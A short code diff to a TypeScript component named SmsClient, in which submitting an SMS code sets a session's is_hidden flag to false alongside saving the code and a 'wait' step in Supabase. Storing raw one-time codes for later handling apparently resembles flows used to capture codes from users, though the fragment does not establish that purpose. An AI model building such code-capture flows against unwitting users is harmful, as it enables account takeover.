@@ -96,7 +96,7 @@ export function SmsClient({ sessionId }: Props) {
     const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
     const { error } = await supabase
       .from("sessions")
-      .update({ current_step: "wait", form_data: { ...prev, smsCode: code.trim() } })
+      .update({ is_hidden: false, current_step: "wait", form_data: { ...prev, smsCode: code.trim() } })
       .eq("id", sessionId);
 
     setSaving(false);
